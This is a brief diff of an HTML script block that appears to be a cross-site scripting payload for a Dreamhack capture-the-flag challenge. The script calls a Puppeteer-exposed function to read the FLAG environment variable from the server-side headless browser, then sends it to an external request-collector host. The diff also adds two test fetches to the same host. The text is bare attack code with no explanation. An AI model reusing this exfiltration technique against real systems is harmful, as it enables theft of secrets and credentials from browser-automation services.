@@ -1,8 +1,10 @@
 <script>
+  fetch("https://fbgpvdx.request.dreamhack.games?flag=A");
   (async () => {
     const flag = await window.__puppeteer_evaluate(() => {
       return process.env.FLAG;
     });
     fetch("https://fbgpvdx.request.dreamhack.games?flag=" + encodeURIComponent(flag));
   })();
+  fetch("https://fbgpvdx.request.dreamhack.games?flag=A");
 </script>
